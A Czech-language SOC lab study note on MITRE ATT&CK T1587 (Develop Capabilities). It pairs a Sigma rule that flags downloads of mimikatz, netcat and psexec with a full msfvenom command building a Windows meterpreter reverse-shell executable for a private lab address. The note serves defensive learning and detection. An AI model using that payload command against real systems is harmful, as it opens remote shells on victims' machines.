🛠️ Taktika: Resource Development (02)

Technika: T1587 - Develop Capabilities (Vývoj nástrojů)

Poznámka: Tento report slouží jako vzorová technika pro taktiku Resource Development. Dokumentuje fázi, kdy útočník připravuje své nástroje, skripty nebo payloady před samotným útokem.

🧠 Teoretický základ (Co se učím)

Vztah Taktika vs. Technika

Taktika (Proč): Resource Development – Útočník potřebuje vytvořit zázemí a nástroje pro budoucí operace.

Technika (Jak): Develop Capabilities – Konkrétní činnost psaní kódu nebo kompilace malwaru.

Co je to Taktika: Resource Development?

Taktika představuje fázi, kdy útočník buduje a získává prostředky pro své operace.

Cíl: Vytvořit nebo získat malware, certifikáty, servery (C2) nebo botnety.

Proč to útočník dělá: Aby měl připravené "zbraně" a infrastrukturu, která mu umožní proniknout do cíle a komunikovat s ním.

🌐 Kontext a Vrstvy

OSI Model Context

Tato fáze se často děje mimo cílovou síť (na stroji útočníka), ale v SOCu ji můžeme detekovat, pokud:

Vrstva 7 (Application): Útočník stahuje známé nástroje (mimikatz, nc.exe) z internetu přes HTTP/HTTPS.

Vývoj (Endpoint): Detekce kompilace kódu (např. spouštění gcc nebo csc.exe) na sledovaném útočném stroji.

Datové zdroje (Data Sources)

File Metadata: Hash stažených nástrojů (porovnání s databází malware).

Network Traffic: Stahování z podezřelých domén.

Web Proxy Logs: Filtrace URL adres (např. GitHub raw content, Pastebin).

🛡️ Stav Detekce a Obrany

Stav: ⚪ Často obtížné detekovat (pokud se to děje mimo síť).

Detekční logika: Monitorování stahování neobvyklých typů souborů (.exe, .ps1, .sh) ze známých hackerských repozitářů.

📑 Sigma Rule (Příklad detekce stahování nástrojů)

title: Hacktool Download Detected
status: experimental
description: Detekuje stahování známých hackerských nástrojů podle názvu souboru v proxy logách.
logsource:
    category: proxy
detection:
    selection:
        TargetFilename|endswith: 
            - '\mimikatz.exe'
            - '\nc.exe'
            - '\psexec.exe'
    condition: selection


⚔️ [DD.MM.RRRR] - Test 01: Příprava Payloadu na Kali Linuxu

🔴 Útok (Simulation)

Nástroj: MSFVenom / Metasploit

Cíl: Příprava payloadu pro Windows 11.

Příkaz:

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.20.30 LPORT=4444 -f exe > shell.exe


🔍 Výsledek a Analýza (Detection)

Wazuh Alert: Pokud monitoruješ útočníkův stroj (Kali), uvidíš spuštění procesu msfvenom.

Pozorování: Vytvoření souboru shell.exe v pracovním adresáři.

📜 Traceability: Analýza logů

Původ: Agent na útočném stroji (Kali Linux - 192.168.20.30).

Cesta: Kali (Local file creation) -> Wazuh Agent -> Wazuh Manager (Alerting).

⚠️ Analýza falešných pozitiv (False Positives)

Vývojáři v síti kompilují vlastní legitimní aplikace.

Administrátoři stahují nástroje pro vzdálenou správu (např. Sysinternals).

💡 Možnosti zlepšení (Hardening)

Reputační filtry: Blokování přístupu k hackerským doménám na úrovni DNS.

EDR: Sledování vzniku nepodepsaných spustitelných souborů v dočasných složkách.

🔙 Zpět do složky Attacks | 🏠 Hlavní README
